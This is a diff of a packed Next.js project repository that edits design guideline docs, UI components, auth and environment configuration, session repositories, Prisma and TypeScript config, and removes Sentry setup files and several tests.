- 17: 1. Fetch the latest guidelines from the Vercel repository.
- 18: 2. Read target files in the project.
- 19: 3. Check all rules against the files.
- 20: 4. Output terse file:line findings.
- 21: 
- 22: ---
- 23: 
- 24: # Key Rule Categories
- 25: 
- 26: ## Accessibility
- 27: 
- 28: - Icon-only buttons need `aria-label`.
- 29: - Never `outline-none` without a focus replacement.
- 30: - Never block paste.
- 31: - Honor `prefers-reduced-motion`.
- 32: - Semantic HTML elements.
- 33: - Color contrast meets WCAG AA.
- 34: 
- 35: ## Focus
- 36: 
- 37: - Visible focus rings on all interactive elements.
- 38: - Logical tab order.
- 39: - Skip links for keyboard navigation.
- 40: - Focus trapping in modals.
- 41: 
- 42: ## Forms
- 43: 
- 44: - Labels associated with inputs.
- 45: - Error messages linked via `aria-describedby`.
- 46: - Required fields indicated visually and programmatically.
- 47: - Inline validation on blur.
- 48: 
- 49: ## Animation
- 50: 
- 51: - Honor `prefers-reduced-motion`.
- 52: - Under 300ms for micro-interactions.
- 53: - `ease-out` for enter, `ease-in` for exit.
- 54: - Virtualize lists over 50 items.
- 55: - Use `transform` and `opacity` for animations.
- 56: 
- 57: ## Typography
- 58: 
- 59: - `text-wrap: balance` on headlines.
- 60: - `text-wrap: pretty` on body text.
- 61: - Line length: 45-90 characters.
- 62: - Consistent type scale.
- 63: 
- 64: ## Content
- 65: 
- 66: - `Intl.DateTimeFormat` for dates.
- 67: - Destructive actions need confirmation or undo.
- 68: - URL reflects state.
- 69: - Loading states for async operations.
- 70: 
- 71: ## Images
- 72: 
- 73: - Explicit `width` and `height`.
- 74: - Use `next/image`.
- 75: - Alt text on meaningful images.
- 76: - Decorative: `alt=""` and `role="presentation"`.
- 77: 
- 78: ## Performance
- 79: 
- 80: - Server Components by default.
- 81: - Lazy load below-the-fold.
- 82: - Minimize client JS.
- 83: - Streaming and Suspense.
- 84: - Prefetch critical navigation.
- 85: 
- 86: ## Touch
- 87: 
- 88: - 40x40px minimum touch targets.
- 89: - `@media (hover: hover)` for hover styles.
- 90: - Safe areas for mobile.
- 91: 
- 92: ## Dark Mode
- 93: 
- 94: - CSS custom properties for themes.
- 95: - Test both modes.
- 96: - Avoid pure black backgrounds.
- 97: - Sufficient contrast in both modes.
- 98: 
- 99: ---
-100: 
-101: # Sources
-102: 
-103: - vercel-labs/web-interface-guidelines (MIT).
-104: - vercel.com/design/guidelines.
-`````
-
-## File: public/file.svg
-`````xml
-1: <svg fill="none" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><path d="M14.5 13.5V5.41a1 1 0 0 0-.3-.7L9.8.29A1 1 0 0 0 9.08 0H1.5v13.5A2.5 2.5 0 0 0 4 16h8a2.5 2.5 0 0 0 2.5-2.5m-1.5 0v-7H8v-5H3v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1M9.5 5V2.12L12.38 5zM5.13 5h-.62v1.25h2.12V5zm-.62 3h7.12v1.25H4.5zm.62 3h-.62v1.25h7.12V11z" clip-rule="evenodd" fill="#666" fill-rule="evenodd"/></svg>
-`````
-
-## File: public/globe.svg
-`````xml
-1: <svg fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><g clip-path="url(#a)"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.27 14.1a6.5 6.5 0 0 0 3.67-3.45q-1.24.21-2.7.34-.31 1.83-.97 3.1M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16m.48-1.52a7 7 0 0 1-.96 0H7.5a4 4 0 0 1-.84-1.32q-.38-.89-.63-2.08a40 40 0 0 0 3.92 0q-.25 1.2-.63 2.08a4 4 0 0 1-.84 1.31zm2.94-4.76q1.66-.15 2.95-.43a7 7 0 0 0 0-2.58q-1.3-.27-2.95-.43a18 18 0 0 1 0 3.44m-1.27-3.54a17 17 0 0 1 0 3.64 39 39 0 0 1-4.3 0 17 17 0 0 1 0-3.64 39 39 0 0 1 4.3 0m1.1-1.17q1.45.13 2.69.34a6.5 6.5 0 0 0-3.67-3.44q.65 1.26.98 3.1M8.48 1.5l.01.02q.41.37.84 1.31.38.89.63 2.08a40 40 0 0 0-3.92 0q.25-1.2.63-2.08a4 4 0 0 1 .85-1.32 7 7 0 0 1 .96 0m-2.75.4a6.5 6.5 0 0 0-3.67 3.44 29 29 0 0 1 2.7-.34q.31-1.83.97-3.1M4.58 6.28q-1.66.16-2.95.43a7 7 0 0 0 0 2.58q1.3.27 2.95.43a18 18 0 0 1 0-3.44m.17 4.71q-1.45-.12-2.69-.34a6.5 6.5 0 0 0 3.67 3.44q-.65-1.27-.98-3.1" fill="#666"/></g><defs><clipPath id="a"><path fill="#fff" d="M0 0h16v16H0z"/></clipPath></defs></svg>
-`````
-
-## File: public/next.svg
-`````xml
-1: <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 394 80"><path fill="#000" d="M262 0h68.5v12.7h-27.2v66.6h-13.6V12.7H262V0ZM149 0v12.7H94v20.4h44.3v12.6H94v21h55v12.6H80.5V0h68.7zm34.3 0h-17.8l63.8 79.4h17.9l-32-39.7 32-39.6h-17.9l-23 28.6-23-28.6zm18.3 56.7-9-11-27.1 33.7h17.8l18.3-22.7z"/><path fill="#000" d="M81 79.3 17 0H0v79.3h13.6V17l50.2 62.3H81Zm252.6-.4c-1 0-1.8-.4-2.5-1s-1.1-1.6-1.1-2.6.3-1.8 1-2.5 1.6-1 2.6-1 1.8.3 2.5 1a3.4 3.4 0 0 1 .6 4.3 3.7 3.7 0 0 1-3 1.8zm23.2-33.5h6v23.3c0 2.1-.4 4-1.3 5.5a9.1 9.1 0 0 1-3.8 3.5c-1.6.8-3.5 1.3-5.7 1.3-2 0-3.7-.4-5.3-1s-2.8-1.8-3.7-3.2c-.9-1.3-1.4-3-1.4-5h6c.1.8.3 1.6.7 2.2s1 1.2 1.6 1.5c.7.4 1.5.5 2.4.5 1 0 1.8-.2 2.4-.6a4 4 0 0 0 1.6-1.8c.3-.8.5-1.8.5-3V45.5zm30.9 9.1a4.4 4.4 0 0 0-2-3.3 7.5 7.5 0 0 0-4.3-1.1c-1.3 0-2.4.2-3.3.5-.9.4-1.6 1-2 1.6a3.5 3.5 0 0 0-.3 4c.3.5.7.9 1.3 1.2l1.8 1 2 .5 3.2.8c1.3.3 2.5.7 3.7 1.2a13 13 0 0 1 3.2 1.8 8.1 8.1 0 0 1 3 6.5c0 2-.5 3.7-1.5 5.1a10 10 0 0 1-4.4 3.5c-1.8.8-4.1 1.2-6.8 1.2-2.6 0-4.9-.4-6.8-1.2-2-.8-3.4-2-4.5-3.5a10 10 0 0 1-1.7-5.6h6a5 5 0 0 0 3.5 4.6c1 .4 2.2.6 3.4.6 1.3 0 2.5-.2 3.5-.6 1-.4 1.8-1 2.4-1.7a4 4 0 0 0 .8-2.4c0-.9-.2-1.6-.7-2.2a11 11 0 0 0-2.1-1.4l-3.2-1-3.8-1c-2.8-.7-5-1.7-6.6-3.2a7.2 7.2 0 0 1-2.4-5.7 8 8 0 0 1 1.7-5 10 10 0 0 1 4.3-3.5c2-.8 4-1.2 6.4-1.2 2.3 0 4.4.4 6.2 1.2 1.8.8 3.2 2 4.3 3.4 1 1.4 1.5 3 1.5 5h-5.8z"/></svg>
-`````
-
-## File: public/vercel.svg
-`````xml
-1: <svg fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1155 1000"><path d="m577.3 0 577.4 1000H0z" fill="#fff"/></svg>
-`````
-
-## File: public/window.svg
-`````xml
-1: <svg fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.5 2.5h13v10a1 1 0 0 1-1 1h-11a1 1 0 0 1-1-1zM0 1h16v11.5a2.5 2.5 0 0 1-2.5 2.5h-11A2.5 2.5 0 0 1 0 12.5zm3.75 4.5a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5M7 4.75a.75.75 0 1 1-1.5 0 .75.75 0 0 1 1.5 0m1.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5" fill="#666"/></svg>
+ 1: # Project Context
+ 2: 
+ 3: ## Vision
+ 4: 
+ 5: Modern, scalable, production-ready web application. Clean architecture. Long-term quality over rapid feature development.
+ 6: 
+ 7: ## Goals
+ 8: 
+ 9: Solid foundation · business logic independent from UI · maximize reuse · great DX · AI-friendly codebase · low tech debt.
+10: 
+11: ## Priorities
+12: 
+13: 1. Maintainability
+14: 2. Performance
+15: 3. Scalability
+16: 4. Developer Experience
+17: 5. Accessibility
+18: 6. Security
+19: 
+20: ## Constraints
+21: 
+22: TypeScript strict · Server Components by default · minimal client JS · SEO-friendly · accessible · reusable components · clean architecture.
+23: 
+24: ## Non-Goals
+25: 
+26: Over-engineering · premature optimization · unnecessary deps · large client bundles · duplicated business logic.
+27: 
+28: ## Success Criteria
+29: 
+30: Easy to extend, test, document, AI-understand, and onboard new developers.
+31: 
+32: ## Documentation Rules
+33: 
+34: Every significant change updates the docs. ADRs before implementation when possible. Docs always reflect current state.
 `````
 
 ## File: src/actions/__tests__/auth.test.ts
@@ -25124,24 +25048,6 @@ tsconfig.json
 3: export const { GET, POST, PATCH, PUT, DELETE } = toNextJsHandler(auth);
 `````
 
-## File: src/app/api/sentry-example-api/route.ts
-`````typescript
- 1: import * as Sentry from "@sentry/nextjs";
- 2: export const dynamic = "force-dynamic";
- 3: class SentryExampleAPIError extends Error {
- 4:   constructor(message: string | undefined) {
- 5:     super(message);
- 6:     this.name = "SentryExampleAPIError";
- 7:   }
- 8: }
- 9: export function GET() {
-10:   Sentry.logger.info("Sentry example API called");
-11:   throw new SentryExampleAPIError(
-12:     "This error is raised on the backend called by the example page.",
-13:   );
-14: }
-`````
-
 ## File: src/app/global-error.tsx
 `````typescript
  1: "use client";
@@ -25185,119 +25091,6 @@ tsconfig.json
 39: }
 `````
 
-## File: src/components/ui/__tests__/card.test.tsx
-`````typescript
- 1: import { render, screen } from "@testing-library/react";
- 2: import {
- 3:   Card,
- 4:   CardHeader,
- 5:   CardTitle,
- 6:   CardDescription,
- 7:   CardContent,
- 8:   CardFooter,
- 9: } from "../card";
-10: describe("Card", () => {
-11:   it("renders children", () => {
-12:     render(
-13:       <Card>
-14:         <CardContent>Test content</CardContent>
-15:       </Card>,
-16:     );
-17:     expect(screen.getByText("Test content")).toBeInTheDocument();
-18:   });
-19:   it("renders with title", () => {
-20:     render(
-21:       <Card>
-22:         <CardHeader>
-23:           <CardTitle>Card Title</CardTitle>
-24:         </CardHeader>
-25:       </Card>,
-26:     );
-27:     expect(screen.getByText("Card Title")).toBeInTheDocument();
-28:   });
-29:   it("renders with description", () => {
-30:     render(
-31:       <Card>
-32:         <CardHeader>
-33:           <CardTitle>Title</CardTitle>
-34:           <CardDescription>Description text</CardDescription>
-35:         </CardHeader>
-36:       </Card>,
-37:     );
-38:     expect(screen.getByText("Description text")).toBeInTheDocument();
-39:   });
-40:   it("renders with footer", () => {
-41:     render(
-42:       <Card>
-43:         <CardContent>Content</CardContent>
-44:         <CardFooter>Footer content</CardFooter>
-45:       </Card>,
-46:     );
-47:     expect(screen.getByText("Footer content")).toBeInTheDocument();
-48:   });
-49:   it("applies custom className", () => {
-50:     const { container } = render(
-51:       <Card className="custom-class">
-52:         <CardContent>Content</CardContent>
-53:       </Card>,
-54:     );
-55:     expect(container.firstChild).toHaveClass("custom-class");
-56:   });
-57: });
-`````
-
-## File: src/components/ui/badge.tsx
-`````typescript
- 1: import { mergeProps } from "@base-ui/react/merge-props";
- 2: import { useRender } from "@base-ui/react/use-render";
- 3: import { cva, type VariantProps } from "class-variance-authority";
- 4: import { cn } from "@/lib/utils";
- 5: const badgeVariants = cva(
- 6:   "group/badge inline-flex h-5 w-fit shrink-0 items-center justify-center gap-1 overflow-hidden rounded-4xl border border-transparent px-2 py-0.5 text-xs font-medium whitespace-nowrap transition-all focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 has-data-[icon=inline-end]:pr-1.5 has-data-[icon=inline-start]:pl-1.5 aria-invalid:border-destructive aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 [&>svg]:pointer-events-none [&>svg]:size-3!",
- 7:   {
- 8:     variants: {
- 9:       variant: {
-10:         default: "bg-primary text-primary-foreground [a]:hover:bg-primary/80",
-11:         secondary:
-12:           "bg-secondary text-secondary-foreground [a]:hover:bg-secondary/80",
-13:         destructive:
-14:           "bg-destructive/10 text-destructive focus-visible:ring-destructive/20 dark:bg-destructive/20 dark:focus-visible:ring-destructive/40 [a]:hover:bg-destructive/20",
-15:         outline:
-16:           "border-border text-foreground [a]:hover:bg-muted [a]:hover:text-muted-foreground",
-17:         ghost:
-18:           "hover:bg-muted hover:text-muted-foreground dark:hover:bg-muted/50",
-19:         link: "text-primary underline-offset-4 hover:underline",
-20:       },
-21:     },
-22:     defaultVariants: {
-23:       variant: "default",
-24:     },
-25:   },
-26: );
-27: function Badge({
-28:   className,
-29:   variant = "default",
-30:   render,
-31:   ...props
-32: }: useRender.ComponentProps<"span"> & VariantProps<typeof badgeVariants>) {
-33:   return useRender({
-34:     defaultTagName: "span",
-35:     props: mergeProps<"span">(
-36:       {
-37:         className: cn(badgeVariants({ variant }), className),
-38:       },
-39:       props,
-40:     ),
-41:     render,
-42:     state: {
-43:       slot: "badge",
-44:       variant,
-45:     },
-46:   });
-47: }
-48: export { Badge, badgeVariants };
-`````
-
 ## File: src/components/ui/label.tsx
 `````typescript
  1: "use client";
@@ -25318,33 +25111,29 @@ tsconfig.json
 16: export { Label };
 `````
 
-## File: src/lib/__tests__/utils.test.ts
+## File: src/components/ui/separator.tsx
 `````typescript
- 1: import { cn } from "../utils";
- 2: describe("cn", () => {
- 3:   it("merges class names", () => {
- 4:     const result = cn("text-red-500", "text-blue-500");
- 5:     expect(result).toBe("text-blue-500");
- 6:   });
- 7:   it("handles conditional classes", () => {
- 8:     const result = cn("base", false && "hidden", "extra");
- 9:     expect(result).toContain("base");
-10:     expect(result).toContain("extra");
-11:     expect(result).not.toContain("hidden");
-12:   });
-13:   it("handles undefined and null", () => {
-14:     const result = cn("base", undefined, null);
-15:     expect(result).toBe("base");
-16:   });
-17:   it("merges tailwind conflicts", () => {
-18:     const result = cn("p-2 p-4");
-19:     expect(result).toBe("p-4");
-20:   });
-21:   it("handles empty input", () => {
-22:     const result = cn();
-23:     expect(result).toBe("");
-24:   });
-25: });
+ 1: "use client";
+ 2: import { Separator as SeparatorPrimitive } from "@base-ui/react/separator";
+ 3: import { cn } from "@/lib/utils";
+ 4: function Separator({
+ 5:   className,
+ 6:   orientation = "horizontal",
+ 7:   ...props
+ 8: }: SeparatorPrimitive.Props) {
+ 9:   return (
+10:     <SeparatorPrimitive
+11:       data-slot="separator"
+12:       orientation={orientation}
+13:       className={cn(
+14:         "bg-border shrink-0 data-horizontal:h-px data-horizontal:w-full data-vertical:w-px data-vertical:self-stretch",
+15:         className,
+16:       )}
+17:       {...props}
+18:     />
+19:   );
+20: }
+21: export { Separator };
 `````
 
 ## File: src/lib/errors/index.ts
@@ -25471,37 +25260,6 @@ tsconfig.json
 40: export type ResetPasswordInput = z.infer<typeof resetPasswordSchema>;
 `````
 
-## File: src/lib/validations/user.ts
-`````typescript
- 1: import * as z from "zod";
- 2: export const updateProfileSchema = z.object({
- 3:   name: z
- 4:     .string()
- 5:     .min(2, "Name must be at least 2 characters")
- 6:     .max(100, "Name must be at most 100 characters")
- 7:     .optional(),
- 8:   image: z.url("Invalid image URL").optional(),
- 9: });
-10: export const assignRoleSchema = z.object({
-11:   userId: z.string().min(1, "User ID is required"),
-12:   roleId: z.string().min(1, "Role ID is required"),
-13: });
-14: export const removeRoleSchema = z.object({
-15:   userId: z.string().min(1, "User ID is required"),
-16:   roleId: z.string().min(1, "Role ID is required"),
-17: });
-18: export type UpdateProfileInput = z.infer<typeof updateProfileSchema>;
-19: export type AssignRoleInput = z.infer<typeof assignRoleSchema>;
-20: export type RemoveRoleInput = z.infer<typeof removeRoleSchema>;
-`````
-
-## File: src/lib/auth-client.ts
-`````typescript
-1: import { createAuthClient } from "better-auth/react";
-2: export const authClient = createAuthClient();
-3: export const { signIn, signUp, signOut, useSession, getSession } = authClient;
-`````
-
 ## File: src/lib/auth.ts
 `````typescript
  1: import { betterAuth } from "better-auth";
@@ -25560,33 +25318,41 @@ tsconfig.json
 54: export type Session = typeof auth.$Infer.Session;
 `````
 
-## File: src/lib/db.ts
+## File: src/lib/env.ts
 `````typescript
- 1: import { neonConfig } from "@neondatabase/serverless";
- 2: import { PrismaNeon } from "@prisma/adapter-neon";
- 3: import { PrismaClient } from "@prisma/client";
- 4: import ws from "ws";
- 5: neonConfig.webSocketConstructor = ws;
- 6: const prismaClientSingleton = () => {
- 7:   const adapter = new PrismaNeon({
- 8:     connectionString: process.env.DATABASE_URL,
- 9:   });
-10:   return new PrismaClient({ adapter });
-11: };
-12: declare const globalThis: {
-13:   prismaGlobal: ReturnType<typeof prismaClientSingleton>;
-14: } & typeof global;
-15: export const prisma = globalThis.prismaGlobal ?? prismaClientSingleton();
-16: if (process.env.NODE_ENV !== "production") globalThis.prismaGlobal = prisma;
+ 1: import { createEnv } from "@t3-oss/env-nextjs";
+ 2: import * as z from "zod";
+ 3: export const env = createEnv({
+ 4:   server: {
+ 5:     DATABASE_URL: z.url(),
+ 6:     DIRECT_URL: z.url().optional(),
+ 7:     BETTER_AUTH_SECRET: z.string().min(32),
+ 8:     BETTER_AUTH_URL: z.url(),
+ 9:     SENTRY_DSN: z.string().optional(),
+10:     SENTRY_ORG: z.string().optional(),
+11:     SENTRY_PROJECT: z.string().optional(),
+12:     SENTRY_AUTH_TOKEN: z.string().optional(),
+13:   },
+14:   client: {
+15:     NEXT_PUBLIC_SENTRY_DSN: z.string().optional(),
+16:   },
+17:   runtimeEnv: {
+18:     DATABASE_URL: process.env.DATABASE_URL,
+19:     DIRECT_URL: process.env.DIRECT_URL,
+20:     BETTER_AUTH_SECRET: process.env.BETTER_AUTH_SECRET,
+21:     BETTER_AUTH_URL: process.env.BETTER_AUTH_URL,
+22:     SENTRY_DSN: process.env.SENTRY_DSN,
+23:     SENTRY_ORG: process.env.SENTRY_ORG,
+24:     SENTRY_PROJECT: process.env.SENTRY_PROJECT,
+25:     SENTRY_AUTH_TOKEN: process.env.SENTRY_AUTH_TOKEN,
+26:     NEXT_PUBLIC_SENTRY_DSN: process.env.NEXT_PUBLIC_SENTRY_DSN,
+27:   },
+28: });
 `````
 
 ## File: src/lib/utils.ts
 `````typescript
-1: import { clsx, type ClassValue } from "clsx";
-2: import { twMerge } from "tailwind-merge";
-3: export function cn(...inputs: ClassValue[]) {
-4:   return twMerge(clsx(inputs));
-5: }
+1: export { cn } from "cn";
 `````
 
 ## File: src/providers/theme-provider.tsx
@@ -25616,109 +25382,38 @@ tsconfig.json
 23: }
 `````
 
-## File: src/repositories/permission.ts
+## File: src/repositories/session.ts
 `````typescript
  1: import { prisma } from "@/lib/db";
- 2: import type { Prisma } from "@prisma/client";
- 3: export async function findPermissionByName(name: string) {
- 4:   return prisma.permission.findUnique({ where: { name } });
- 5: }
- 6: export async function findPermissionById(id: string) {
- 7:   return prisma.permission.findUnique({ where: { id } });
- 8: }
- 9: export async function createPermission(data: Prisma.PermissionCreateInput) {
-10:   return prisma.permission.create({ data });
-11: }
-12: export async function deletePermission(id: string) {
-13:   return prisma.permission.delete({ where: { id } });
-14: }
-15: export async function findAllPermissions() {
-16:   return prisma.permission.findMany();
-17: }
-`````
-
-## File: src/repositories/role-permission.ts
-`````typescript
- 1: import { prisma } from "@/lib/db";
- 2: export async function assignPermissionToRole(
- 3:   roleId: string,
- 4:   permissionId: string,
- 5: ) {
- 6:   return prisma.rolePermission.create({
- 7:     data: { roleId, permissionId },
- 8:   });
- 9: }
-10: export async function removePermissionFromRole(
-11:   roleId: string,
-12:   permissionId: string,
-13: ) {
-14:   return prisma.rolePermission.delete({
-15:     where: { roleId_permissionId: { roleId, permissionId } },
-16:   });
-17: }
-18: export async function findRolePermission(roleId: string, permissionId: string) {
-19:   return prisma.rolePermission.findUnique({
-20:     where: { roleId_permissionId: { roleId, permissionId } },
-21:   });
+ 2: export async function findSessionByToken(token: string) {
+ 3:   return prisma.session.findUnique({
+ 4:     where: { token },
+ 5:     include: { user: true },
+ 6:   });
+ 7: }
+ 8: export async function findSessionById(id: string) {
+ 9:   return prisma.session.findUnique({
+10:     where: { id },
+11:     include: { user: true },
+12:   });
+13: }
+14: export async function findSessionsByUserId(userId: string) {
+15:   return prisma.session.findMany({
+16:     where: { userId },
+17:     orderBy: { createdAt: "desc" },
+18:   });
+19: }
+20: export async function deleteSession(id: string) {
+21:   return prisma.session.delete({ where: { id } });
 22: }
-`````
-
-## File: src/repositories/role.ts
-`````typescript
- 1: import { prisma } from "@/lib/db";
- 2: import type { Prisma } from "@prisma/client";
- 3: export async function findRoleByName(name: string) {
- 4:   return prisma.role.findUnique({ where: { name } });
- 5: }
- 6: export async function findRoleById(id: string) {
- 7:   return prisma.role.findUnique({
- 8:     where: { id },
- 9:     include: {
-10:       rolePermissions: {
-11:         include: { permission: true },
-12:       },
-13:     },
-14:   });
-15: }
-16: export async function createRole(data: Prisma.RoleCreateInput) {
-17:   return prisma.role.create({ data });
-18: }
-19: export async function deleteRole(id: string) {
-20:   return prisma.role.delete({ where: { id } });
-21: }
-22: export async function findAllRoles() {
-23:   return prisma.role.findMany({
-24:     include: {
-25:       _count: { select: { userRoles: true } },
-26:     },
-27:   });
-28: }
-`````
-
-## File: src/repositories/user-role.ts
-`````typescript
- 1: import { prisma } from "@/lib/db";
- 2: export async function assignRoleToUser(userId: string, roleId: string) {
- 3:   return prisma.userRole.create({
- 4:     data: { userId, roleId },
- 5:   });
- 6: }
- 7: export async function removeRoleFromUser(userId: string, roleId: string) {
- 8:   return prisma.userRole.delete({
- 9:     where: { userId_roleId: { userId, roleId } },
-10:   });
-11: }
-12: export async function findUserRole(userId: string, roleId: string) {
-13:   return prisma.userRole.findUnique({
-14:     where: { userId_roleId: { userId, roleId } },
-15:   });
-16: }
-17: export async function findUserRoles(userId: string) {
-18:   return prisma.userRole.findMany({
-19:     where: { userId },
-20:     include: { role: true },
-21:   });
-22: }
+23: export async function deleteSessionsByUserId(userId: string) {
+24:   return prisma.session.deleteMany({ where: { userId } });
+25: }
+26: export async function deleteExpiredSessions() {
+27:   return prisma.session.deleteMany({
+28:     where: { expiresAt: { lt: new Date() } },
+29:   });
+30: }
 `````
 
 ## File: src/repositories/user.ts
@@ -26473,105 +26168,6 @@ tsconfig.json
 154: }
 `````
 
-## File: src/services/session.ts
-`````typescript
- 1: import * as sessionRepository from "@/repositories/session";
- 2: import { NotFoundError } from "@/lib/errors";
- 3: export async function getSessionByToken(token: string) {
- 4:   const session = await sessionRepository.findSessionByToken(token);
- 5:   if (!session) {
- 6:     throw new NotFoundError("Session not found");
- 7:   }
- 8:   return session;
- 9: }
-10: export async function getUserSessions(userId: string) {
-11:   return sessionRepository.findSessionsByUserId(userId);
-12: }
-13: export async function revokeSession(sessionId: string) {
-14:   return sessionRepository.deleteSession(sessionId);
-15: }
-16: export async function revokeAllUserSessions(userId: string) {
-17:   return sessionRepository.deleteSessionsByUserId(userId);
-18: }
-19: export async function revokeExpiredSessions() {
-20:   return sessionRepository.deleteExpiredSessions();
-21: }
-22: export async function isSessionValid(session: {
-23:   expiresAt: Date;
-24: }): Promise<boolean> {
-25:   return session.expiresAt > new Date();
-26: }
-`````
-
-## File: src/services/user.ts
-`````typescript
- 1: import * as userRepository from "@/repositories/user";
- 2: import { NotFoundError } from "@/lib/errors";
- 3: export async function getUserById(id: string) {
- 4:   const user = await userRepository.findUserById(id);
- 5:   if (!user) {
- 6:     throw new NotFoundError("User not found");
- 7:   }
- 8:   return user;
- 9: }
-10: export async function getUserByEmail(email: string) {
-11:   return userRepository.findUserByEmail(email);
-12: }
-13: export async function createUser(data: { email: string; name?: string }) {
-14:   const existing = await userRepository.findUserByEmail(data.email);
-15:   if (existing) {
-16:     throw new Error("Email already in use");
-17:   }
-18:   return userRepository.createUser(data);
-19: }
-20: export async function updateUser(
-21:   id: string,
-22:   data: { name?: string; image?: string },
-23: ) {
-24:   const user = await userRepository.findUserById(id);
-25:   if (!user) {
-26:     throw new NotFoundError("User not found");
-27:   }
-28:   return userRepository.updateUser(id, data);
-29: }
-30: export async function deleteUser(id: string) {
-31:   const user = await userRepository.findUserById(id);
-32:   if (!user) {
-33:     throw new NotFoundError("User not found");
-34:   }
-35:   return userRepository.deleteUser(id);
-36: }
-`````
-
-## File: src/instrumentation-client.ts
-`````typescript
- 1: import * as Sentry from "@sentry/nextjs";
- 2: Sentry.init({
- 3:   dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
- 4:   integrations: [Sentry.replayIntegration()],
- 5:   tracesSampleRate: 1,
- 6:   replaysSessionSampleRate: 0.1,
- 7:   replaysOnErrorSampleRate: 1.0,
- 8:   dataCollection: {
- 9:   },
-10: });
-11: export const onRouterTransitionStart = Sentry.captureRouterTransitionStart;
-`````
-
-## File: src/instrumentation.ts
-`````typescript
- 1: import * as Sentry from "@sentry/nextjs";
- 2: export async function register() {
- 3:   if (process.env.NEXT_RUNTIME === "nodejs") {
- 4:     await import("../sentry.server.config");
- 5:   }
- 6:   if (process.env.NEXT_RUNTIME === "edge") {
- 7:     await import("../sentry.edge.config");
- 8:   }
- 9: }
-10: export const onRequestError = Sentry.captureRequestError;
-`````
-
 ## File: components.json
 `````json
  1: {
@@ -26581,7 +26177,7 @@ tsconfig.json
  5:   "tsx": true,
  6:   "tailwind": {
  7:     "config": "",
- 8:     "css": "app/globals.css",
+ 8:     "css": "src/app/globals.css",
  9:     "baseColor": "neutral",
 10:     "cssVariables": true,
 11:     "prefix": ""
@@ -26601,54 +26197,56 @@ tsconfig.json
 25: }
 `````
 
-## File: postcss.config.mjs
-`````javascript
-1: const config = {
-2:   plugins: {
-3:     "@tailwindcss/postcss": {},
-4:   },
-5: };
-6: export default config;
+## File: prisma.config.ts
+`````typescript
+ 1: import "dotenv/config";
+ 2: import { defineConfig } from "prisma/config";
+ 3: export default defineConfig({
+ 4:   datasource: {
+ 5:     url:
+ 6:       process.env.DIRECT_URL ||
+ 7:       process.env.DATABASE_URL ||
+ 8:       "postgresql://placeholder:placeholder@localhost:5432/placeholder",
+ 9:   },
+10: });
 `````
 
-## File: sentry.client.config.ts
-`````typescript
- 1: import * as Sentry from "@sentry/nextjs";
- 2: Sentry.init({
- 3:   dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
- 4:   tracesSampleRate: process.env.NODE_ENV === "production" ? 0.1 : 1.0,
- 5:   debug: false,
- 6:   replaysOnErrorSampleRate: 1.0,
- 7:   replaysSessionSampleRate: process.env.NODE_ENV === "production" ? 0.1 : 1.0,
- 8:   integrations: [
- 9:     Sentry.replayIntegration({
-10:       maskAllText: true,
-11:       blockAllMedia: true,
-12:     }),
-13:   ],
-14: });
-`````
-
-## File: sentry.edge.config.ts
-`````typescript
-1: import * as Sentry from "@sentry/nextjs";
-2: Sentry.init({
-3:   dsn: process.env.SENTRY_DSN ?? process.env.NEXT_PUBLIC_SENTRY_DSN,
-4:   tracesSampleRate: 1,
-5:   dataCollection: {
-6:   },
-7: });
-`````
-
-## File: sentry.server.config.ts
-`````typescript
-1: import * as Sentry from "@sentry/nextjs";
-2: Sentry.init({
-3:   dsn: process.env.SENTRY_DSN ?? process.env.NEXT_PUBLIC_SENTRY_DSN,
-4:   tracesSampleRate: 1,
-5:   dataCollection: {
-6:   },
-7: });
+## File: tsconfig.json
+`````json
+ 1: {
+ 2:   "compilerOptions": {
+ 3:     "target": "ES2017",
+ 4:     "lib": ["dom", "dom.iterable", "esnext"],
+ 5:     "allowJs": true,
+ 6:     "skipLibCheck": true,
+ 7:     "strict": true,
+ 8:     "noEmit": true,
+ 9:     "esModuleInterop": true,
+10:     "module": "esnext",
+11:     "moduleResolution": "bundler",
+12:     "resolveJsonModule": true,
+13:     "isolatedModules": true,
+14:     "jsx": "react-jsx",
+15:     "incremental": true,
+16:     "plugins": [
+17:       {
+18:         "name": "next"
+19:       }
+20:     ],
+21:     "paths": {
+22:       "@/*": ["./src/*"]
+23:     }
+24:   },
+25:   "include": [
+26:     "next-env.d.ts",
+27:     "**/*.ts",
+28:     "**/*.tsx",
+29:     ".next/types/**/*.ts",
+30:     ".next/dev/types/**/*.ts",
+31:     "**/*.mts"
+32:   ],
+33:   "exclude": ["node_modules"]
+34: }
 `````
 
 ## File: docs/concepts/Press Feedback and Hit Areas.md
@@ -26721,178 +26319,6 @@ tsconfig.json
 66: 
 67: - Make Interfaces Feel Better (Jakub Krehel) - Press states and hit areas.
 68: - Vercel web-design-guidelines - Focus management.
-`````
-
-## File: docs/deliverables/Quickstart.md
-`````markdown
- 1: # Quickstart
- 2: 
- 3: Get up and running with the design skill system.
- 4: 
- 5: ---
- 6: 
- 7: # For Developers
- 8: 
- 9: 1. Read `docs/meta/Start Here.md`.
-10: 2. Read `docs/rules/Architecture and Stack.md`.
-11: 3. Read `docs/rules/AI Tells (Forbidden Patterns).md`.
-12: 4. Bookmark `docs/deliverables/Design Skills Cheat Sheet.md`.
-13: 
-14: ---
-15: 
-16: # For AI Agents (tool-agnostic)
-17: 
-18: 1. Read the project-level instructions file at the repository root:
-19:    - `AGENTS.md` (preferred, supported by most tools including Cursor, Claude Code, Aider, Codex CLI, and OpenCode).
-20:    - If your tool requires a different filename (e.g. `CLAUDE.md` for Claude Code, `.cursorrules` for Cursor, `.github/copilot-instructions.md` for Copilot), read whichever file your tool actually loads — they are kept in sync with `AGENTS.md`.
